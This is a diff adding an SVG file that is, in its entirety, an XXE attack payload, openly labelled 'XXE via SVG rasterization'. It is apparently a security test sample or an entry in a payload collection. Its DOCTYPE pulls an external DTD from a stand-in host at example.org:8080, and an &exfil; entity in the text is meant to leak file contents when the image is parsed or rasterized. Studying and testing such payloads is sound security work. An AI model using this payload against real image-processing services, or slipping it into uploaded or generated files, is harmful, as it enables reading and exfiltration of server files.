@@ -1,0 +1,19 @@
+<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE svg [
+<!ELEMENT svg ANY >
+<!ENTITY % sp SYSTEM "http://example.org:8080/xxe.xml">
+%sp;
+%param1;
+]>
+<svg viewBox="0 0 200 200" version="1.2" xmlns="http://www.w3.org/2000/svg" style="fill:red">
+      <text x="15" y="100" style="fill:black">XXE via SVG rasterization</text>
+      <rect x="0" y="0" rx="10" ry="10" width="200" height="200" style="fill:pink;opacity:0.7"/>
+      <flowRoot font-size="15">
+         <flowRegion>
+           <rect x="0" y="0" width="200" height="200" style="fill:red;opacity:0.3"/>
+         </flowRegion>
+         <flowDiv>
+            <flowPara>&exfil;</flowPara>
+         </flowDiv>
+      </flowRoot>
+</svg>
